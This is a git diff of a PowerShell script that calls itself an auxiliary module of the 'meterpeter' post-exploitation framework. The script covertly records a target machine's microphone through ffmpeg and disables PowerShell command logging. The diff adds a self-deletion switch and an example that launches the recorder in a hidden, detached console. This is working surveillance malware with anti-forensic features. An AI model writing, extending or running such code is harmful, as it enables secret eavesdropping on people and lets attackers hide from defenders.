@@ -6,7 +6,7 @@
    Tested Under: Windows 10 (19044) x64 bits
    Required Dependencies: ffmpeg.exe {auto-download}
    Optional Dependencies: none
-   PS cmdlet Dev version: v1.0.1
+   PS cmdlet Dev version: v1.0.2
 
 .DESCRIPTION
    Auxiliary Module of meterpeter v2.10.14.1 that records native
@@ -29,6 +29,9 @@
 .Parameter Random
    Switch that random generates Mp3 filename
 
+.Parameter AutoDelete
+   Switch that auto-deletes this cmdlet in the end
+
 .EXAMPLE
    PS C:\> .\rec_audio.ps1 -workingDir "$pwd"
    Use current directory as working directory
@@ -42,7 +45,7 @@
    Random generate MP3 file name (create multiple files)
 
 .EXAMPLE
-   PS C:\> Start-Process -windowstyle hidden powershell -argumentlist "-file rec_audio.ps1 -rectime '60'"
+   PS C:\> Start-Process -windowstyle hidden powershell -argumentlist "-file rec_audio.ps1 -rectime 60 -autodelete"
    Execute this cmdlet for 60 seconds in an hidden console detach from parent process (orphan process)
 
 .INPUTS
@@ -74,12 +77,13 @@
 [CmdletBinding(PositionalBinding=$false)] param(
    [string]$Mp3Name="AudioClip.mp3",
    [string]$WorkingDir="$Env:TMP",
+   [switch]$AutoDelete,
    [int]$RecTime='10',
    [switch]$Random
 )
 
 
-$cmdletver = "v1.0.1"
+$cmdletver = "v1.0.2"
 $IPath = (Get-Location).Path.ToString()
 $ErrorActionPreference = "SilentlyContinue"
 ## Disable Powershell Command Logging for current session.
@@ -136,4 +140,12 @@ Else
 
 .\ffmpeg.exe -y -hide_banner -f dshow -i audio="$MicName" -t $RecTime -c:a libmp3lame -ar 44100 -b:a 128k -ac 1 $MP3Path;
 cd "$IPath"
+
+
+## CleanUp
+If($AutoDelete.IsPresent)
+{
+   ## Auto Delete this cmdlet in the end ...
+   Remove-Item -LiteralPath $MyInvocation.MyCommand.Path -Force
+}
 exit
